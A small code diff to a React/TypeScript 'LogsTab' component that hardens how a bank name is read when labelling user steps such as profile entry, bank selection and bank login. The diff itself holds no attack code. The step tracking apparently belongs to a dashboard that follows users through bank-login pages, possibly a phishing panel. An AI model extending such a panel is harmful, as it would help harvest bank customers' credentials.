@@ -1621,7 +1621,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
                 else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
                 else if (s === "bank") {
-                  const bName = fd.viewingBankName || fd.bankName;
+                  const bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
                   stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
                   stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
                 }
